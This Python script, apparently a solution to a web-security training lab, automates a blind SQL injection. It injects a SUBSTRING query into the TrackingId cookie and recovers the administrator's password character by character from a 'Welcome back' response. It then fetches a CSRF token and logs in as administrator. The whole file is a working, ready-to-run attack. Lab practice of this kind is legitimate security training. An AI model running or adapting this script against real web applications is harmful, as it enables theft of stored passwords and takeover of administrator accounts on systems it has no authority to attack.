import requests
import sys
import time
import re

def get_cookies(url):
    response = requests.get(url)
    cookies = response.cookies
    session_id = cookies.get('session')
    tracking_id = cookies.get('TrackingId')
    if not session_id or not tracking_id:
        raise ValueError("Cookies 'session' and/or 'TrackingId' not found.")
    return tracking_id, session_id

def cookie_with_injection(substr_position, payload, tracking_id, session_id):
    return f"TrackingId={tracking_id}' AND (SELECT SUBSTRING(password,{substr_position},1) FROM users WHERE username='administrator')='{payload}; session={session_id}"

def check_matched_payload(data, position, char):
    search_string = "Welcome back"
    if search_string in data:
        print(f"{char}")
        return {'position': position, 'char': char}
    else:
        return None

def get_csrf_token(response_text):
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text)
    if csrf_token_match:
        return csrf_token_match.group(1)
    else:
        raise ValueError("CSRF token not found.")

def perform_login(login_url, csrf_token, password):
    response = requests.post(login_url, data={
        'csrf': csrf_token,
        'username': 'administrator',
        'password': password
    })
    print(response.text)
   
def make_req_with_delay(url, tracking_id, session_id, delay):
    result = []
    payloads = "0123456789abcdefghijklmnopqrstuvwxyz"

    for substr_position in range(1, 21):
        for char in payloads:
            try:
                headers = {
                    'Cookie': cookie_with_injection(substr_position, char, tracking_id, session_id)
                }
                response = requests.get(url, headers=headers)
                match_result = check_matched_payload(response.text, substr_position, char)

                if match_result:
                    result.append(match_result)
                    break
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(delay / 1500)

    result_sorted = sorted(result, key=lambda x: x['position'])
    password = ''.join(x['char'] for x in result_sorted)

    print(f"Password: {password}")

    try:
        response = requests.get(url + '/login')
        csrf_token = get_csrf_token(response.text)
        print(f"CSRF Token: {csrf_token}")
        perform_login(url + '/login', csrf_token, password)
    except ValueError as e:
        print(e)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <initial_url>")
        sys.exit(1)

    initial_url = sys.argv[1]
    delay = int(150)

    try:
        tracking_id, session_id = get_cookies(initial_url)
        print(f"TrackingId: {tracking_id}")
        print(f"SessionId: {session_id}")

        make_req_with_delay(initial_url, tracking_id, session_id, delay)

    except ValueError as e:
        print(e)
        sys.exit(1)
